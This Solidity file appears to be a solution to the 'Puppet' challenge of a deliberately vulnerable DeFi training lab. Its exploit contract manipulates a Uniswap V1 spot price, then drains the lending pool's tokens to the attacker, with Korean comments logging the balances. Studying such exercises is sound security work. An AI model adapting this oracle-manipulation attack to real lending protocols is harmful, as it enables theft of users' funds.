// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";
import "./PuppetPool.sol";

interface UniswapV1 {
    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_ethm, uint256 deadline) external returns (uint256);

    function ethToTokenSwapInput(uint256 min_tokens, uint256 deadline) external payable returns (uint256);
}

contract PuppetExploit {
    using Address for address payable;

    PuppetPool public puppetPool;
    DamnValuableToken public immutable token;
    address public immutable uniswapPair;
    address public attacker;

    constructor(address tokenAddress, address uniswapPairAddress, address puppetPoolAddress) payable {
        token = DamnValuableToken(tokenAddress);
        uniswapPair = uniswapPairAddress;
        puppetPool = PuppetPool(puppetPoolAddress);
        attacker = msg.sender;
    }

    function callAttackerBalance() public view returns (uint256) {
        return attacker.balance;
    }

    //PuppetExploitContract
    function attack1() external {
        uint256 initialAttackerBalance = token.balanceOf(address(this));
        //initialAttackerBalance 는 1000임
        token.approve(address(uniswapPair), initialAttackerBalance);
        //1000DVT를 ETH로 swap해서 address(this)에 있음
        UniswapV1(uniswapPair).tokenToEthSwapInput(initialAttackerBalance, 1, block.timestamp + 300);
        //address(this)에 DVT는 없고 이더만 있음.
        // 그리고 calculateDepositRequired(1) => 0.000196643298887982 가 나옴.
        //10.000000000000000000 전 TOEKN
        //10.000000000000000000 전 ETH
        //91.487247492932384417 후 TOEKN
        // 1.099304865938430984 후 ETH

        uint256 poolBalance = token.balanceOf(address(puppetPool)); // uniswappair => puppetPool
        uint256 etherBal = address(this).balance;
        puppetPool.borrow{value: etherBal}(poolBalance);
        UniswapV1(uniswapPair).ethToTokenSwapInput{value: 1 ether}(1, block.timestamp + 300); // Hardcoded 1 ETH as an example
        // Send all DVT and remaining ETH back to the attacker
        token.transfer(attacker, token.balanceOf(address(this)));
        (bool success, ) = attacker.call{value: address(this).balance}("");
        require(success);
    }

    receive() external payable {}
}
